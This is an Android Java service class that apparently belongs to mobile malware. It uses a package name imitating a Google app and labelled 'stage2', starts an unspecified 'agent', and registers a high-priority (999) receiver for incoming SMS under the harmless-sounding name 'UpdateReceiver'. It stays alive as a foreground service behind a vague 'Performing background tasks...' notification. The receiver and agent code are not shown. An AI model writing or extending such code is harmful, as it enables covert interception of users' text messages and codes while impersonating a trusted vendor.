package com.google.android.apps.work.stage2;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.content.IntentFilter;
import android.util.Log;


public class MainService extends Service {
    private UpdateReceiver smsReceiver;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        ((MainApplication) getApplication()).agent.start(this, new Intent(), null);
        Log.d("SVC", "onCreate");

        smsReceiver = new UpdateReceiver();
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(999);
        registerReceiver(smsReceiver, filter);
        Log.d("SVC", "SMS Receiver registered dynamically");
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        if (smsReceiver != null) {
            unregisterReceiver(smsReceiver);
        }
        ((MainApplication) getApplication()).agent.onStop();
        Log.d("SVC", "onDestroy");
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        super.onStartCommand(intent, i, i2);
        Log.d("SVC", "onStartCommand");
        
        String channelId = "main_service_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId,
                    "Main Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(getApplicationContext(), channelId);
        } else {
            builder = new Notification.Builder(getApplicationContext());
        }

        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }

        builder.setContentIntent(PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), flags))
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentTitle("Service Running")
                .setContentText("Performing background tasks...")
                .setWhen(System.currentTimeMillis());
        
        Notification notificationBuild = builder.build();
        startForeground(110, notificationBuild);
        return Service.START_NOT_STICKY;
    }
}
